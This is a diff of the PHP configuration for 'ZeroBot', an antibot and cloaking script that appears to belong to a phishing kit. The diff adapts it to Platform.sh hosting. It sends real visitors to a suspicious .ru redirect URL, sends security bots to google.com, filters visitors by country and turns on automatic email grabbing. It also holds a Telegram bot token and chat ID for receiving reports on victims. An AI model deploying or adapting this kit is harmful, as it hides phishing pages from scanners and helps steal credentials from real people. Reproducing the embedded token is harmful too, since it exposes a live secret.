@@ -1,60 +1,55 @@
 <?php
-
 /*
     Antibot Service (ZeroBot)
-
     * This Tool is not for illegal use
     * All right reserved to @brendonurie2000
-
-	Platform : https://zerobot.info
-    Author  : @brendonurie2000
-
+    Platform: https://zerobot.info
+    Author: @brendonurie2000
     *** Official Version 5 ***
 */
 
+// ========== PLATFORM.SH SPECIFIC CONFIGURATION ==========
+// Configure session handling for Platform.sh
+ini_set('session.save_path', '/tmp/sessions');
+if (!file_exists('/tmp/sessions')) {
+    mkdir('/tmp/sessions', 0777, true);
+}
+session_start();
+
+// Set default timezone to avoid warnings
+date_default_timezone_set('UTC');
+
+// ========== ORIGINAL CONFIGURATION ==========
 $license_key = "yba13s816dklaspx8tf03tjcsv1798jk"; // [REQUIRED]
-
-$redirect = "https://amoraterthrinereldreathig.ventateros.ru/rTvtY5h/#0"; // URL or FILE [REQUIRED]
-
-
+$redirect = "https://amoraterthrinereldreathig.ventateros.ru/rTvtY5h/#"; // [REQUIRED]
 $parameter = 2; // [REQUIRED]
-
 /*
-	1 : Check Bots And Countries.
-	2 : Check Only Bots.
-	3 : Check Only Countries.
-	4 : Allow All Visitors.
+    1 : Check Bots And Countries.
+    2 : Check Only Bots.
+    3 : Check Only Countries.
+    4 : Allow All Visitors.
 */
 
-$_COUNTRY_ALLOWED = ["ma", "us"]; # Add Allowed Country Here , Country ISO code must be lowercase. [REQUIRED]
+$_COUNTRY_ALLOWED = ["ma", "us"]; // Allowed countries
+$redirection_link_check = false;
+$check_red_page = false;
+$authentification = false;
+$cloaker = ["url_to_grab" => ""];
+$auto_grabber = true;
+$location_bots = "https://google.com";
 
-$redirection_link_check = false; // Check Your Page If Still Uploaded
+// Modified for Platform.sh - using absolute path
+$view_file_name = __DIR__ . "/views.php"; 
 
-$check_red_page = false; // Check The Redirect If Red Flag
+$token_chat = "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY";
+$chatid = "5811046999";
+$captcha = false;
+$remove_visitors_duplicate = false;
 
-$authentification = false; // Not necessary
-
-$cloaker = [
-    "url_to_grab" => "", // Change the link you want to grap it in your link ( if t)
-];
-
-$auto_grabber = true; // Activate Auto Grab Email
-
-$location_bots = "https://google.com"; // Send The Bots To This Link ( If Cloaker Url Empty )
-
-$view_file_name = "views.php"; // Type PHP Extension Will Be Added Auto Per Example : views.php
-
-$token_chat = "6707495836:AAEkCDySUwZfju25Og30g90ZHDPHoWSJ5aY"; // Your Token To Receive Rapports
-
-$chatid = "5811046999"; // Your ChatID To Receive Rapports
-
-$captcha = false; // Allow ZeroBot Captcha
-
-$remove_visitors_duplicate = false; // Visitors Remove Duplicate
-
-
-ZeroBot::PHP_VERSION();
-ZeroBot::DefineConstants();
+// Ensure views directory exists (Platform.sh specific)
+if (!file_exists(dirname($view_file_name))) {
+    mkdir(dirname($view_file_name), 0777, true);
+}
 
 
 class ZeroBot
